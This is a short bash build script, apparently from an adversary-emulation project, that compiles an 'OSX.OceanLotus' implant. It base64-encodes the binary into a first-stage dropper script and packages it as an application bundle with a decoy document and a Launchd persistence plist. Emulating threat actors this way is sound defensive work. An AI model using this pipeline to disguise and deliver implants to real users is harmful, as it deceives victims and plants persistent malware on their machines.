#!/bin/bash

# ---------------------------------------------------------------------------
# build_osx.oceanlotus.sh - builds all components of the OSX.OceanLotus implant
#                           and should be executed from Resources/OSX.OceanLotus

# Usage: ./build_osx.oceanlotus.sh

# Revision History:

# ---------------------------------------------------------------------------

# build the implant
cd Implant/
xcodebuild -scheme Implant build -configuration Release
build_directory=$(xcodebuild -project Implant.xcodeproj -showBuildSettings | grep -m 1 "CONFIGURATION_BUILD_DIR" | grep -oEi "\/.*")

# update the b64 payload inside the Application Bundle script
cd ../ApplicationBundle

echo -n "payload=\"" > Implant_base64.txt
b64=$(cat $build_directory/Implant | base64)
echo -n "$b64\"" >> Implant_base64.txt

# sed -i -E "s:payload=\".*\":payload=\"${b64_payload}\":" first_stage.sh
printf '%s\n' '/payload=/r Implant_base64.txt' 1 '/payload=/d' w | ed first_stage.sh

# build the Application Bundle
./build_bundle.sh -s first_stage.sh -i W8BN.icns -d decoy.doc -p Launchd.plist -n "TestApp"
rm Implant_base64.txt
